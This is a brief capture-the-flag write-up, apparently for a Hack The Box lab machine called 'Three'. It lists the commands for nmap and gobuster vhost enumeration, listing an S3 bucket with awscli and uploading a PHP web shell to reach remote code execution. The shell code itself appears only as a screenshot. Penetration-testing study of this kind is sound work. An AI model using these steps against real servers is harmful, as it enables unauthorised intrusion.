# THREE

STARTING POINT - TIER 1

## Enumeration

**Nmap scan**

```bash
nmap -sC -sV 10.129.27.230
```

![nmap](pics/nmap.png)

## Exploitation

**Config hosts**

```bash
nano /etc/hosts
```

![host](pics/host.png)

**Sub-domain scanning**

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

![gobuster](pics/gobuster.png)

**Add new host**

![host1](pics/host1.png)

**Using `awscli` to connect to the aws server**

```bash
aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
```

![aws](pics/aws.png)

- You must be configured the awscli `aws configure`.

**Create a PHP shell**

![shell](pics/shell.png)

**Add PHP shell to the aws serer**

```bash
aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php  s3://thetoppers.htb
```

![aws1](pics/aws1.png)

**RCE**

![rce](pics/rce.png)
